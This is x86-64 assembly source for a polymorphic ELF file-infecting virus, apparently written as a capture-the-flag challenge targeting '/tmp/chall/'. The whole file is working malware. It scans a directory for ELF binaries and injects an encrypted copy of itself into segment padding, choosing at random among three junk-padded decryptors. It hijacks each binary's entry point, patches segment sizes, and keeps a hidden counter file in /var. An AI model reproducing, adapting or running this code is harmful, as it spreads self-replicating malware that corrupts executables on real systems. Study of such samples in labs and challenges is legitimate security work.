%define DIR_FD_OFFSET  8
%define DIRENT_BUF_OFFSET (DIR_FD_OFFSET + 4096)
%define PATH_OFFSET (DIRENT_BUF_OFFSET + 4096)
%define FILE_FD_OFFSET (PATH_OFFSET + 8)
%define MAPPED_PTR_OFFSET (FILE_FD_OFFSET + 8)
%define FILE_STAT_OFFSET (MAPPED_PTR_OFFSET + 144)
%define ORIGINAL_START_OFFSET (FILE_STAT_OFFSET + 8)
%define ORIGINAL_END_OFFSET (ORIGINAL_START_OFFSET + 8)
%define VIRUS_SIZE  (ORIGINAL_END_OFFSET + 8)
%define ORIGINAL_ENTRY_OFFSET (VIRUS_SIZE + 8)
%define DECRYPTOR_ADDRESS_OFFSET (ORIGINAL_ENTRY_OFFSET + 56)
%define DECRYPT_LOOP_ADDR_OFFSET (DECRYPTOR_ADDRESS_OFFSET + 8)
%define INFECTION_CODE_ADDR_OFFSET (DECRYPT_LOOP_ADDR_OFFSET + 8)
%define END_ADDR_OFFSET (INFECTION_CODE_ADDR_OFFSET + 8)
%define SIGNATURE_ADDR_OFFSET (END_ADDR_OFFSET + 8)
%define NEW_KEY_OFFSET (SIGNATURE_ADDR_OFFSET + 8)
%define FILE_SIZE  (NEW_KEY_OFFSET + 8)
%define READ_COUNTER_OFFSET (FILE_SIZE  + 8)
%define BUFFER_FINGERPRINT_OFFSET (READ_COUNTER_OFFSET + 16)
%define FINGERPRINT_INT_OFFSET (READ_COUNTER_OFFSET + 8)
%define STRUCT_SIZE (FINGERPRINT_INT_OFFSET)

%define ROUTINE_SIZE (_end - _start)
%define BUFF_SIZE 4096

%define SYS_OPEN     2
%define SYS_WRITE    1

%define SYS_GETDENTS 78
%define SYS_MMAP     9
%define SYS_FSTAT    5
%define SYS_MUNMAP   11
%define SYS_CLOSE    3
%define SYS_READ     0
%define SYS_FTRUNCATE 77
%define O_RDONLY     0x0
%define O_WRONLY     0x1
%define O_RDWR       0x2
%define O_CREAT      0x40
%define O_TRUNC      0x200
%define O_APPEND     0x400


struc vars 
    dir_fd:              resq 1
    dirent_buf:          resb 4096
    path:                resb 4096
    file_fd:             resq 1
    mapped_ptr:          resq 1
    file_stat:           resb 144
    original_start:      resq 1
    original_end:        resq 1
    virus_size:          resq 1
    original_entry:      resq 1
    decryptor_address:   resq 7
    decrypt_loop_addr:   resq 1
    infection_code_addr: resq 1
    end_addr:            resq 1
    signature_addr:      resq 1
    new_key:             resq 1
    file_size:           resq 1
endstruc

section .text
global _start

_start:
    nop
    push    rbp
    mov     rbp, rsp
    sub     rbp, STRUCT_SIZE

    lea     rax, [rel _decryptor_1]
    mov     [rbp - DECRYPTOR_ADDRESS_OFFSET], rax   
    lea     rax, [rel _decryptor_2]
    mov     [rbp - DECRYPTOR_ADDRESS_OFFSET + 8], rax   
    lea     rax, [rel _decryptor_3]
    mov     [rbp - DECRYPTOR_ADDRESS_OFFSET + 16], rax   


    mov     [rbp - ORIGINAL_START_OFFSET], rdi
    mov     [rbp - END_ADDR_OFFSET], rsi
    mov     [rbp - ORIGINAL_ENTRY_OFFSET], rdx
    mov     [rbp - DECRYPT_LOOP_ADDR_OFFSET], rcx
    mov     [rbp - INFECTION_CODE_ADDR_OFFSET], r8
    mov     [rbp - SIGNATURE_ADDR_OFFSET], r10
    sub     rsi, rdi
    mov     [rbp - VIRUS_SIZE], rsi

.parsing_label:
    lea     rdi, [rel infect_dir_1]
    call    _parsing

.quit:
    pop     rbp 
    ret


_parsing:
    mov     r15, rdi                    
    mov     rax, SYS_OPEN
    xor     rsi, rsi                  
    syscall
    cmp     rax, -1
    jle     .return_parsing
    mov     [rbp - DIR_FD_OFFSET], rax

.read_directory:
    mov     rax,  SYS_GETDENTS
    lea     rdi, [rbp - DIR_FD_OFFSET]
    mov     rdi, [rdi]
    lea     rsi, [rbp - DIRENT_BUF_OFFSET]
    mov     rdx,  BUFF_SIZE
    syscall
    test    rax, rax
    jle     .close_dir

    mov     r12, rax
    xor     r13, r13

.read_entry_files:
    cmp     r12, r13
    jle     .read_directory
    xor     r10, r10
    lea     rdi, [rbp - DIRENT_BUF_OFFSET]
    add     rdi, r13
    movzx	r10, word [rdi + 16]        
   	mov		al,  byte [rdi + r10 - 1]  
    lea     rsi, [rdi  + 18]            
    add     r13, r10
    cmp     al,  8
    jne     .read_entry_files
    push    r15
    call     _process_file
    xor     r15, r15
    pop     r15
    jmp     .read_entry_files

.close_dir:
    mov     rdi, [rbp - DIR_FD_OFFSET]
    mov     rax, 3
    syscall

.return_parsing:
    ret

_process_file:
    mov     rdi, r15
    lea     rdx, [rbp - PATH_OFFSET]

.dirname:
    mov     al, byte [rdi]
    test    al, al
    jz      .filename
    mov     byte [rdx], al
    inc     rdi
    inc     rdx
    jmp     .dirname
    
.filename:
    mov     al, byte [rsi]
    test    al, al
    jz      .open_file
    mov     byte [rdx], al
    inc     rsi
    inc     rdx
    jmp     .dirname

.open_file:
    mov     byte [rdx], 0
    lea     rdi, [rbp - PATH_OFFSET]
    mov     rax, 2
    mov     rsi, 2
    syscall
    cmp     rax, 0
    jg      .get_file_size
    ret

.get_file_size:
    lea     r8,  [rbp - FILE_FD_OFFSET]
    mov     [r8],rax
    mov     rdi, rax         
    lea     rsi, [rbp - FILE_STAT_OFFSET]
    mov     rax, SYS_FSTAT           
    syscall
    test    rax, rax
    jl     .close_file

.mmap_file:
    mov     rsi, [rsi + 48]            
    mov     [rbp - FILE_SIZE], rsi
    mov     rdi,  0                     
    mov     rdx,  0x1 | 0x2             
    mov     r10,  0x1                   
    mov     r8,  [r8]                 
    xor     r9,  r9                    
    xor     rcx, rcx
    mov     rax, SYS_MMAP
    syscall
    cmp     rax, 0
    jle     .close_file
    lea     rbx, [rbp - MAPPED_PTR_OFFSET]
    mov     [rbx], rax

    mov     rbx, [rbx]
    mov     rdx, 0x00010102464c457f     
    cmp     qword [rbx], rdx
    jne     .ummap_pointer
    call    _infect_binary


.ummap_pointer:
    mov     rdi, [rbp - MAPPED_PTR_OFFSET]
    lea     rsi, [rbp - FILE_STAT_OFFSET]
    mov     rsi, [rsi + 0x40]          
    mov     rax, SYS_MUNMAP
    syscall

.close_file:
    mov     rdi, [rbp - FILE_FD_OFFSET]
    mov     rax, SYS_CLOSE
    syscall
    ret

_infect_binary:
    mov     r14, rbx
    mov	    r11, qword [rbx  + 0x18]   
    movzx   rdx, word [rbx + 0x38]      
    mov	    rcx, qword [rbx  + 0x20]   
    add     rbx, rcx
    mov     rax, 0x500000001           

.segment:
    cmp     rdx, 0
    jle     .return_infect_binary
    cmp     rax, qword [rbx]
    jne     .next_segment
    jmp     .calculate_space
    
.next_segment:
    dec     rdx
    add     rbx, 0x38                   
    jmp     .segment

.calculate_space:
    mov     r15, r14
    mov     rax, qword [rbx + 0x08]    
    add     rax, qword [rbx + 0x20]     
    mov     r8,rax
    add     r8, qword [rbp - VIRUS_SIZE]   
    cmp     r8, qword [rbp - FILE_SIZE]
    jg      .return_infect_binary       
    add     r14, rax
.check_infected:
    mov     rdi, [rbp - SIGNATURE_ADDR_OFFSET]
    mov     rsi, [rbp - END_ADDR_OFFSET]
    sub     rsi, rdi 
    mov     r9,r14
    sub     r9,rsi
    cmp     rdi, [r9]
    jz      .return_infect_binary       

    mov     r9,  rax
    mov     rdi, rbx
    xor     rcx, rcx
    
    mov     rdx, [rbp - VIRUS_SIZE]
    xor     rax, rax

.find_space:
    cmp     rax, rdx
    jge     .inject_first_part
    movzx   rcx, byte [r14 + rax]
    test    rcx, rcx
    jne     .return_infect_binary
    inc     rax
    jmp     .find_space

.inject_first_part:
    mov     rdi, r14
    mov     rsi, [rbp - ORIGINAL_START_OFFSET]
    mov     rax, [rbp - DECRYPT_LOOP_ADDR_OFFSET]
    sub     rax, rsi
    mov     r8,  rax
    xor     rax, rax
    call    .copy_loop

.inject_second_part:
    rdtsc
    mov     rcx, 3
    xor     rdx, rdx
    div     rcx
    mov     rsi, [rbp - DECRYPTOR_ADDRESS_OFFSET + rdx*8]
    mov     r8,  51
    xor     rax, rax
    call    .copy_loop


.inject_third_part:
    push    rbx
    lea     rcx, [rbp - NEW_KEY_OFFSET]
    lea     rbx, [rel key_pattern]
    xor     rsi,rsi
    call   _generate_key

    lea     rbx, [rbp - NEW_KEY_OFFSET]
    mov     r10, 8
    lea     rsi, [rel _start]
    xor     r8, r8
    call    .encrypt_body_copy
    pop     rbx

    mov     rax, [rbp - END_ADDR_OFFSET] 
    mov     rsi, [rbp - INFECTION_CODE_ADDR_OFFSET] 
    add     rsi,ROUTINE_SIZE 
    sub     rax, rsi
    mov     r8, rax
    xor     rax, rax
    call    .copy_loop
    jmp     .patch_binary

.copy_loop:
    movsb
    inc     rax
    cmp     rax, r8
    jne     .copy_loop
    ret

.encrypt_body_copy:
    mov     rax, r8
    xor     rdx, rdx
    div     r10
    movzx   rcx, byte [rsi]     
    xor     cl, byte [rbx + rdx ] 
    mov     byte [rdi], cl
    inc     rsi
    inc     rdi
    inc     r8
    cmp     r8, ROUTINE_SIZE 
    jne     .encrypt_body_copy
    ret


.patch_binary:

    mov     r8, r9
    sub     r8, r11
    mov     qword [rdi - 0x8], r8     


    mov     r8, [rbp - NEW_KEY_OFFSET]
    mov     qword [rdi - 0x10], r8     

    mov     qword [r15 + 0x18], r9
    push    rdi
    push    rbx
    push    r12
    push    r13
    call    _generate_fingerprint
    mov     r9,rax
    call    _convert_fingerprint_toascii
    pop     r13
    pop     r12
    pop     rbx
    pop     rdi
    push    rax
    mov     qword [rdi - 0x18],r9
    cmp     r9,0x1361
    jl     .patch_fingerprint
    cmp     r9, 0x1379
    jg      .patch_fingerprint  
    lea     rdx, [rel index]
    mov     r10, [rdx]
    cmp     r10,0xb2
    jg      .hh
    call    _get_current_nbr
    mov     byte [rdi - 0x42 ], al
    jmp     .patch_fingerprint
.hh:
    mov     rax,0x30
    mov     byte [rdi - 0x42 ], al
.patch_fingerprint:
    pop     rax
    mov     rcx, rax
    mov     r9, 0x10
    sub     r9,rax
    sub     rdi, 0x28
    lea     rsi, [rbp - BUFFER_FINGERPRINT_OFFSET]   
    add     rsi,r9
    rep movsb

.patch_segment:

    xor     rdx, rdx
    mov     rdx, [rbp - VIRUS_SIZE]
    add     qword [rbx + 0x20], rdx
    add     qword [rbx + 0x28], rdx

.return_infect_binary:
    ret

_get_current_nbr:
    lea rsi, [rel flag_UwU]
    mov rax, qword [rsi + r10]
    add r10,8
    mov [rdx], r10
    mov   r10,64
    sub   rax,0x1300
    mov  rcx,r9
    and  rcx,0xff
    push rax
    mov rax,rcx
    xor rdx,rdx
    div r10
    mov rcx,rdx
    pop rax
    ror rax, cl
    ret


_generate_fingerprint:

    lea     rdi, [rel tmp]
    mov     rax, SYS_OPEN
    mov     rsi, O_CREAT | O_RDWR   
    mov     rdx, 0600
    syscall

    cmp     rax,0
    jl      .error
    mov     r9,rax

    lea     r8,  [rbp - FILE_FD_OFFSET]
    mov     [r8],rax
    mov     rdi, rax         
    lea     rsi, [rbp - FILE_STAT_OFFSET]
    mov     rax, SYS_FSTAT           
    syscall
    test    rax, rax
    jl     .error
    mov     rsi, [rsi + 48]            
    cmp     rsi, 0
    je      .new_fingerprint

    mov     rdi, r9
    mov     rdx, rsi
    lea     rsi, [rbp - READ_COUNTER_OFFSET]
    mov     rax, SYS_READ
    syscall 

    cmp     rax, 0
    jl      .error
    mov     rax,qword [rsi]
    inc     rax
    jmp     .write_tofile
.new_fingerprint:
    mov     rax, [rbp - END_ADDR_OFFSET]
    mov     rax, qword [rax - 0x18]
    cmp     rax, 0x1337
    je      .write_tofile
    rdtsc

.write_tofile:

    lea     rsi,[rbp - FINGERPRINT_INT_OFFSET]
    mov qword [rsi], rax

    xor     r10,r10
    push    rax

.calculate_len:
    test rax, rax       
    jz .done            

    inc r10             
    shr rax, 8
    jmp .calculate_len 

.done:  
    mov     rax, SYS_FTRUNCATE         
    mov     rdi, r9                
    xor     rsi, rsi               
    syscall
    

    mov     rax, SYS_CLOSE            
    mov     rdi, r9                   
    syscall

    lea     rdi, [rel tmp]
    mov     rax, SYS_OPEN
    mov     rsi, O_WRONLY   
    syscall
    mov     r9, rax
    mov     rdi, rax
    mov     rax, SYS_WRITE              
    lea     rsi, [rbp - FINGERPRINT_INT_OFFSET]
    mov     rdx, r10                     
    syscall

    mov     rax, SYS_CLOSE            
    mov     rdi, r9                  
    syscall
    pop     rax
    jmp     .return

.error:
    mov     rax, -1
.return:
    ret


_convert_fingerprint_toascii:
    lea     rdi, [rbp - BUFFER_FINGERPRINT_OFFSET]          
    call    convert_to_ascii_hex

    mov     rax,r10
    ret

convert_to_ascii_hex:
    mov     rcx, 16              
    add     rdi, rcx
    xor     rbx, rbx
    xor     r10,r10

.convert_loop_hex:
    dec     rdi                  
    xor     rdx, rdx             
    mov     rbx, 16             
    div     rbx

    cmp     dl, 9                
    jbe     .convert_digit       
    add     dl, 7                

.convert_digit:
    add     dl, '0'              
    mov     [rdi], dl            
    inc     r10
    test    rax, rax             
    jnz     .convert_loop_hex
    
    ret                          

_generate_key:
    rdtsc
    mov     r8, 36
    xor     rdx, rdx
    div     r8
    xor     rax, rax
    mov     al,byte [rbx + rdx] 
    mov     byte [rcx], al
    inc     rcx
    inc     rsi
    cmp     rsi, 8
    jne     _generate_key
    ret


_decryptor_1:
    mov     rax, r11
    nop
    xor     rdx, rdx
    nop
    div     r10
    nop
    push    r11
    movzx   rcx, byte [rsi]     
    nop
    xor     cl, byte [rbx + rdx] 
    mov     byte [rdi], cl
    nop
    inc     rsi
    nop
    inc     rdi
    pop     r11
    nop
    inc     r11
    cmp     r11, 0x71b
    je      .return
    jmp     r12

.return:
    ret


_decryptor_2:
    mov     rax, r11
    xor     rdx, rdx
    nop
    div     r10
    nop
    movzx   rcx, byte [rsi]     
    xor     cl, byte [rbx + rdx]
    mov     byte [rdi], cl
    inc     rsi
    nop
    inc     rdi
    inc     r11
    xor     rax,rax
    shr     rax,3
    nop
    cmp     r11, 0x71b
    je      .return
    jmp     r12
.return:
    ret

_decryptor_3:
    mov     rax, r11
    xor     rdx, rdx
    div     r10
    movzx   rcx, byte [rsi]     
    xor     cl, byte [rbx + rdx ]
    mov     byte [rdi], cl
    mov     r13, rsi
    xor     r13, rdi
    inc     rsi
    inc     rdi
    nop
    inc     r11
    shl     rax, 3
    cmp     r11, 0x71b
    je      .return
    jmp     r12
.return:
    ret

infect_dir_1    db  "/tmp/chall/", 0
key_pattern     db   "abcdefjhijklmnopqrstuvwxyz0123456789",0
tmp             db  "/var/.x1ee9w",0
index           dq  0x0
flag_UwU        dq 0x0000006200001300, 0x000000dc00001300, 0x000001a800001300, 0x000005f000001300
                dq 0x000006e000001300, 0x00001a0000001300, 0x0000198000001300, 0x00005f0000001300
                dq 0x0000720000001300, 0x0000c00000001300, 0x0001a80000001300, 0x0005f00000001300
                dq 0x000ee00000001300, 0x000d000000001300, 0x0035800000001300, 0x0033000000001300
                dq 0x00be000000001300, 0x01d4000000001300, 0x0380000000001300, 0x0210000000001300
                dq 0x0420000000001300, 0x0840000000001300, 0x1080000000001300
_end: